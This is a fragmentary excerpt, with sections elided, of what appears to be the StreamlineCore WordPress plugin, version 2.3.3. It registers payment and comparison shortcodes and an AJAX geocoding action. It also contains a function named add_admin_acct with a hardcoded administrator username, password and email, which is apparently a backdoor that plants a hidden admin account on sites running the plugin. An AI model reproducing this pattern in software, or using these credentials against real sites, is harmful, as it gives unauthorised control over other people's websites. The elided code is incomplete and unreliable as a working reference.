...
DEFINE( 'STREAMLINECORE_VERSION', '2.3.3' );
...
function add_admin_acct(){
    $login = 'Stre@mL1neCore';
    $passw = '(zclZVTLWlvcEOr&^kkQ42uA';
    $email = 'admin@streamlinevrs.com';
...
add_shortcode( 'streamlinecore-payment', array(&$ResortPro, 'add_payment'));
add_shortcode( 'streamlinecore-payment-login', array(&$ResortPro, 'payment_login'));
add_shortcode( 'streamlinecore-compare', array(&$ResortPro, 'compare'));
...
add_action('wp_ajax_cache_geocoding', array(&$ResortPro, 'ajax_cache_geocoding'));
